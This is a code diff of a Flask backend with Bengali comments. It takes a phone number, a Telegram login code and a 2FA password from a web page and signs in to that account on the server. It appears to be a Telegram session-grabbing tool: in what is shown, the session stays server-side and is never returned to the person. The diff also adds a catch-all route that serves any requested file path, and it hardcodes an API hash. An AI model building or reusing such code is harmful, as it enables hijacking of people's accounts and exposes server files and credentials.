@@ -12,7 +12,8 @@ CORS(app)
 API_ID = 33511945
 API_HASH = "d044392a17690c14ee5b4a23651a0700"
 
-temp_store = {}
+# একটিভ ক্লায়েন্ট এবং হাশগুলো মেমোরিতে ধরে রাখার জন্য গ্লোবাল ডিকশনারি
+active_clients = {}
 
 @app.route('/', methods=['GET'])
 def home():
@@ -21,12 +22,18 @@ def home():
     except Exception:
         return "index.html not found", 404
 
-@app.route('/verify', methods=['GET'])
-def verify_page():
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def serve_file(path):
+    if path == "verify":
+        try:
+            return send_file('verify.html')
+        except Exception:
+            return "verify.html not found", 404
     try:
-        return send_file('verify.html')
+        return send_file(path)
     except Exception:
-        return "verify.html not found", 404
+        return "File not found", 404
 
 @app.route('/send-code', methods=['POST'])
 def send_code():
@@ -40,15 +47,19 @@ def send_code():
         session_name = f"session_{phone.replace('+', '')}"
         
         async def main():
+            # ইন-মেমোরি ক্লায়েন্ট তৈরি করে কানেক্ট করা
             client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
             sent_code = await client.send_code(phone)
-            phone_code_hash = sent_code.phone_code_hash
-            await client.disconnect()
-            return phone_code_hash
+            
+            # ক্লায়েন্টটি গ্লোবাল ডিকশনারিতে সেভ করে রাখা হচ্ছে যাতে ভেরিফাই করার সময় ডিসকানেক্ট না হয়
+            active_clients[phone] = {
+                "client": client,
+                "phone_code_hash": sent_code.phone_code_hash
+            }
+            return sent_code.phone_code_hash
 
         phone_code_hash = asyncio.run(main())
-        temp_store[phone] = phone_code_hash
         
         return jsonify({
             "status": "success", 
@@ -64,24 +75,24 @@ def verify_code():
     data = request.json
     phone = data.get('phone')
     code = data.get('code')
-    phone_code_hash = data.get('phone_code_hash') or temp_store.get(phone)
     password = data.get('password')
     
-    if not phone or not code or not phone_code_hash:
-        return jsonify({"status": "error", "message": "Phone, Code and Hash are required"}), 400
+    if not phone or not code:
+        return jsonify({"status": "error", "message": "Phone and Code are required"}), 400
+
+    if phone not in active_clients:
+        return jsonify({"status": "error", "message": "Session expired or please request code again."}), 400
+
+    client_data = active_clients[phone]
+    client = client_data["client"]
+    phone_code_hash = client_data["phone_code_hash"]
 
     try:
-        session_name = f"session_{phone.replace('+', '')}"
-        
         async def verify_main():
-            client = Client(session_name, api_id=API_ID, api_hash=API_HASH, in_memory=True)
-            await client.connect()
-            
             try:
                 await client.sign_in(phone, phone_code_hash, code)
             except SessionPasswordNeeded:
                 if not password:
-                    await client.disconnect()
                     return {"status": "2fa_required"}
                 
                 await client.check_password(password)
@@ -101,8 +112,8 @@ def verify_code():
         if res and res.get("status") == "2fa_required":
             return jsonify({"status": "2fa_required", "message": "2FA Password required"})
             
-        if phone in temp_store:
-            del temp_store[phone]
+        if phone in active_clients:
+            del active_clients[phone]
             
         return jsonify({"status": "success", "message": "Session generated successfully!"})
         
